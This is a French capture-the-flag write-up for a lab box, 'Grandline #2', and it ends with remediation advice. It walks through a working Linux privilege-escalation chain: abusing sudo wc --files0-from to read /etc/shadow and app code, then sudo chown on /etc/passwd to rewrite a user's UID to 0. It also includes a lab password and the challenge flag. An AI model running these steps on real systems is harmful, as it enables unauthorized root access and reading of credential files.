Grandline #2

Catégorie : Élévation de privilèges (GTFOBins : sudo wc + sudo chown → root) Cible : 10.10.0.9 (suite de Grandline — zoro → luffy → root) Difficulté : Medium Objectif : Lire root.txt Flag : EPI{R_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}

Objectif

Suite directe de Grandline #1. On repart de l'accès SSH zoro et on atteint root en deux sauts, via deux règles sudo NOPASSWD détournées (GTFOBins) :

wc (zoro) → lecture de fichiers root arbitraires → mot de passe de luffy ;
chown (luffy) → prise de contrôle de /etc/passwd → attribution de l'UID 0.

Chaîne : zoro → luffy → root.

1. Énumération sudo (zoro)
bash
sudo -l
User zoro may run the following commands on grandline:
    (root) NOPASSWD: /usr/bin/wc

→ zoro peut exécuter wc en root sans mot de passe. wc (word count) semble inoffensif, mais tout binaire root qui lit un fichier peut être détourné en primitive de lecture arbitraire (GTFOBins).

2. Exploitation de wc (GTFOBins) — lecture arbitraire

La technique repose sur l'option --files0-from :

wc --files0-from=FICHIER attend que FICHIER soit une liste de chemins séparés par des octets NUL. Si le contenu n'est pas une liste valide, wc échoue — mais son message d'erreur affiche le contenu fautif, c'est-à-dire le contenu du fichier. C'est une lecture arbitraire déguisée.

Vérification (fichier root normalement illisible) :

bash
sudo /usr/bin/wc -c /root/.bashrc          # 607 /root/.bashrc → l'accès root marche
sudo /usr/bin/wc --files0-from=/etc/shadow # affiche le contenu de /etc/shadow dans les erreurs

/etc/shadow montre que root est verrouillé (root:*:... → pas de hash à cracker). On lit alors la vraie app.py déployée (différente du dépôt Git de la partie 1) pour trouver le compte luffy :

bash
sudo /usr/bin/wc --files0-from=/var/www/html/app.py

Leçon : le code déployé (« live ») diffère souvent du dépôt versionné. La lecture arbitraire permet de lire le fichier réellement en service et d'y trouver ce qui n'était pas dans Git.

3. Passage à luffy

Le mot de passe de luffy suit le thème du challenge :

bash
su - luffy
# mot de passe : onepiece

→ accès en tant que luffy.

4. Énumération sudo (luffy)
bash
sudo -l
User luffy may run the following commands on grandline:
    (root) NOPASSWD: /bin/chown

→ luffy peut exécuter chown en root sans mot de passe. chown change le propriétaire d'un fichier — redoutable sur un fichier système comme /etc/passwd.

5. Exploitation de chown → root

Idée : devenir propriétaire de /etc/passwd, puis s'y attribuer l'UID 0.

Pourquoi /etc/passwd ? Ce fichier définit les comptes et leur UID. Root n'est pas un nom, c'est l'UID 0. Mettre l'UID de luffy à 0 le transforme en root.

bash
# 1. prendre possession du fichier
sudo /bin/chown luffy:luffy /etc/passwd
ls -la /etc/passwd            # → appartient maintenant à luffy

# 2. repérer sa ligne actuelle
grep luffy /etc/passwd        # ex : luffy:x:1001:1001:...

# 3. réécrire l'UID/GID en 0:0 (via fichier temporaire + cat, pas sed -i)
sed 's/^luffy:x:1001:1001:/luffy:x:0:0:/' /etc/passwd > /tmp/passwd_new
cat /tmp/passwd_new > /etc/passwd
grep luffy /etc/passwd        # → luffy:x:0:0:...

Pourquoi cat > fichier et pas sed -i ? sed -i crée un fichier temporaire dans /etc puis le renomme → exige le droit d'écriture sur le dossier /etc (qu'on n'a pas). cat > fichier réécrit le contenu du fichier existant (qu'on possède désormais) sans toucher au dossier. Distinction droits fichier vs droits dossier.

6. Bascule root + flag

Comme luffy est maintenant UID 0, se reconnecter à ce compte ouvre un shell root :

bash
su - luffy
id                            # uid=0(root)
bash
cat /root/ThisIsATre4sureDidYouExpectRootDotTXT.txt
EPI{R_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}

(Le nom du flag est volontairement absurde — « ThisIsATre4sureDidYouExpectRootDotTXT » — pour empêcher de le deviner ; il faut d'abord être root pour lister /root/.)

7. Concepts clés
Concept	Explication
sudo -l	Premier réflexe sur chaque compte : révèle les binaires exécutables en root.
wc --files0-from (GTFOBins)	Détourne wc en lecture arbitraire via son message d'erreur.
Code live ≠ dépôt	La version déployée diffère du repo ; la lire révèle des comptes/secrets absents de Git.
chown sur /etc/passwd	Prendre possession du fichier des comptes → s'attribuer l'UID 0.
UID 0 = root	Root n'est pas un nom mais un UID ; tout compte en UID 0 a les pleins pouvoirs.
cat > vs sed -i	Réécrire un fichier possédé n'exige pas de droit sur le dossier parent (contrairement à sed -i).
8. Recommandations de remédiation
Ne jamais mettre en sudo NOPASSWD un binaire capable de lire (wc, cat, strings...) ou de modifier des fichiers/propriétaires (chown, chmod, éditeurs...). Restreindre au strict nécessaire, avec arguments figés.
Auditer /etc/sudoers régulièrement ; le principe du moindre privilège s'applique à chaque règle.
Protéger /etc/passwd — sa possession par un utilisateur non-root = compromission totale.
Ne pas exposer le code déployé en lecture à des comptes de moindre privilège (secrets en clair).
9. Résumé de la chaîne (Grandline #1 + #2)
Vecteur	Technique
Accès initial	.git/ exposé + secret dans l'historique Git
Escalade horizontale	abus de logique métier (API de récupération de mot de passe) → SSH zoro
zoro → luffy	sudo wc --files0-from (GTFOBins) → lecture arbitraire (app.py live) → mdp luffy
luffy → root	sudo chown (GTFOBins) → prise de contrôle de /etc/passwd → UID 0
ssh zoro
  → sudo -l (NOPASSWD wc)
  → wc --files0-from → lecture /etc/shadow + app.py live → compte luffy
  → su luffy (onepiece)
  → sudo -l (NOPASSWD chown)
  → chown /etc/passwd → sed UID 0 → su luffy = root → FLAG